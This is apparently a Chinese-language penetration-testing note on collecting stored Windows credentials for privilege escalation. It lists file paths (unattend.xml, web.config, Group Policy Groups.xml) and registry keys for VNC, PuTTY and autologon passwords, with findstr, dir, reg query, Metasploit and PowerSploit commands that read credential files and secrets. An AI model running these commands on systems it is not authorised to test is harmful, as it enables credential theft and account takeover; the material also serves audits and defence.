---
title: "收集Windows用户凭证"
author: ["4shen0ne"]
tags: ["windows"]
draft: false
---

通过搜索本地存储的管理员凭证, 是最直接简单的提权方法


## Windows Deployment Services {#windows-deployment-services}

WDS，Windows 部署服务，主要应用于大中型网络中的计算机操作系统的批量化部署。使用
WDS 可以通过网络管理和部署映像以及进行无交互的安装（unattended installation）。

优势：

-   降低部署难度以及手动安装付出的时间成本
-   允许基于网络安装 Windows 操作系统
-   可以在无操作系统的主机上安装操作系统

过程：

1.  客户端在启动过程中，通过 DHCP 服务器得到 IP 地址
2.  客户端通过广播或 `DHCP` 查找到 WDS 服务器，并尝试连接它，启动 `Windows PE`
3.  客户端开始安装 WDS 服务器上的操作系统映像，完成所有安装工作

当使用 WDS 部署 Windows 后，管理员的密码会以 `base64` 编码保存在以下的某个路径中：

```nil
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

使用 msf 模块发现 WDS 的登录凭证：use post/windows/gather/enum_unattend


## IIS 配置文件 {#iis-配置文件}

如果主机上允许了 IIS, 配置文件 `web.config` 中可能有管理员的明文密码

常见路径:

```nil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

包含管理员密码的 `web.config` 文件例子:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<authentication mode="Windows">
<forms>
<credentials passwordFormat="Clear">
<user name="Admin" password="Admin" />
</credentials>
</forms>
</authentication>
</system.web>
</configuration>
```


## Group Policy Preferences {#group-policy-preferences}

组策略的相关文件 `Groups.xml` 包含用户密码, 可以在本地缓存或者 DC 中找到, 密码是加
密存储的, 但微软发布了它的密钥, 可以进行破解

```nil
C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
```

除了组策略, 其他策略的相关文件也可能包含密码:

```nil
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml
```


## 搜索密码的命令 {#搜索密码的命令}

查找包含 `password` 关键字的文件:

```nil
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
```

查找可能包含密码的敏感文件:

```nil
C:\> dir /b /s unattend.xml
C:\> dir /b /s web.config
C:\> dir /b /s sysprep.inf
C:\> dir /b /s sysprep.xml
C:\> dir /b /s *pass*
C:\> dir /b /s vnc.ini
```


## 第三方应用 {#第三方应用}

一些常见的第三方应用, 以及它们用来保存密码的文件

-   McAfee

    ```text
    %AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml
    ```

-   UltraVNC
    ```nil
      [ultravnc]
      passwd=5FAEBBD0EF0A2413
    ```

-   RealVNC

    ```text
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
    ```

-   Putty

    ```text
    reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"
    ```

-   Registry
    ```nil
      reg query HKLM /f password /t REG_SZ /s
      reg query HKCU /f password /t REG_SZ /s
    ```

-   Windows Autologin

    ```text
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    ```

-   SNMP Parameters

    ```text
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
    ```


## PowerSploit {#powersploit}

PowerSploit 中查找登录凭证的命令:

```nil
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```
